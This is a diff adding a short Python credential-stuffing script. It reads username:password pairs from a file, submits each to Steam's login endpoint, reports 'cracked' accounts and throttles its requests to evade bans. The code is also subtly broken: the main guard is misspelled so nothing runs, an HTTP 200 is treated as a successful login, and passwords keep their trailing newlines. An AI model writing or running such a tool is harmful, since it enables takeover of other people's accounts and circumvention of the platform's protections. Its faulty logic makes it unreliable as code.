@@ -1,0 +1,25 @@
+import requests
+import json
+import time
+def main():
+    # Get the list of Steam accounts to crack.
+    with open("steam_accounts.txt", "r") as f:
+        steam_accounts = f.readlines()
+    # Loop through the Steam accounts and try to crack them.
+    for steam_account in steam_accounts:
+        # Get the Steam account's username and password.
+        username = steam_account.split(":")[0]
+        password = steam_account.split(":")[1]
+        # Try to login to the Steam account.
+        try:
+            response = requests.post("https://steamcommunity.com/login/dologin/", data={"username": username, "password": password})
+            # If the login was successful, print the Steam account's username and password.
+            if response.status_code == 200:
+                print(f"Successfully cracked Steam account: {username}:{password}")
+        except:
+            # If the login failed, print an error message.
+            print(f"Failed to crack Steam account: {username}:{password}")
+        # Sleep for 1 second to avoid getting banned by Steam.
+        time.sleep(1)
+if _name_ == "_main_":
+    main()
